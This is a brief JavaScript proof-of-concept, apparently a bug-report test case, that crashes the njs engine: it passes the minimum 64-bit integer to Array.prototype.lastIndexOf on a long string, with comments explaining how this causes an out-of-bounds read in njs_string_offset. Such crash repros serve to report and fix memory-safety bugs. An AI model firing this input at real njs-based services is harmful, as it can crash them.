// PoC for njs_string_offset vulnerability
// This triggers a segmentation fault by causing an out-of-bounds read
// in the string map during reverse iteration

// Create a string long enough to have a string map (longer than 32 characters)
var str = "A".repeat(100); // 100 characters ensures string map is allocated

// Use Array.prototype.lastIndexOf with the minimum int64_t value
// When converted to size_t in njs_string_offset, this becomes a very large positive value
// causing an out-of-bounds read in the string map at map[index / NJS_STRING_MAP_STRIDE - 1]
Array.prototype.lastIndexOf.call(str, "A", -9223372036854775808);